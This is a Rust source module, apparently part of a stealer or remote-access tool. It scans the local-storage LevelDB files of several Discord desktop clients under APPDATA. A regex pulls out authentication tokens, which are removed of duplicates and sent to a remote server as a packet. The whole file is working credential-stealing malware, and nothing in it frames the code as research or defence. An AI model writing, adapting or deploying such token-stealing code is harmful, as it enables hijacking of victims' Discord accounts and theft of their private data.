use common::packets::{DiscordTokenData, DiscordTokenInfo, ServerboundPacket};
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use crate::handler::send_packet_sync;

static DISCORD_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"mfa\.[\w-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}").unwrap()
});

const DISCORD_CLIENTS: &[&str] = &[
    "Discord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
];

pub fn send_discord_tokens() {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let mut seen = HashSet::new();
    let mut tokens = Vec::new();

    for client in DISCORD_CLIENTS {
        let leveldb = PathBuf::from(&appdata)
            .join(client)
            .join("Local Storage")
            .join("leveldb");
        if leveldb.exists() {
            scan_leveldb(&leveldb, client, &mut seen, &mut tokens);
        }
    }

    let payload = DiscordTokenData { tokens };
    let _ = send_packet_sync(ServerboundPacket::DiscordTokenData(payload));
}

fn scan_leveldb(path: &Path, source: &str, seen: &mut HashSet<String>, results: &mut Vec<DiscordTokenInfo>) {
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                if ext != "log" && ext != "ldb" {
                    continue;
                }
            } else {
                continue;
            }
            if let Ok(data) = fs::read(&path) {
                let contents = String::from_utf8_lossy(&data);
                for capture in DISCORD_TOKEN_RE.captures_iter(&contents) {
                    if let Some(token_match) = capture.get(0) {
                        let token = token_match.as_str().to_string();
                        if seen.insert(token.clone()) {
                            results.push(DiscordTokenInfo {
                                source: source.to_string(),
                                token,
                            });
                        }
                    }
                }
            }
        }
    }
}
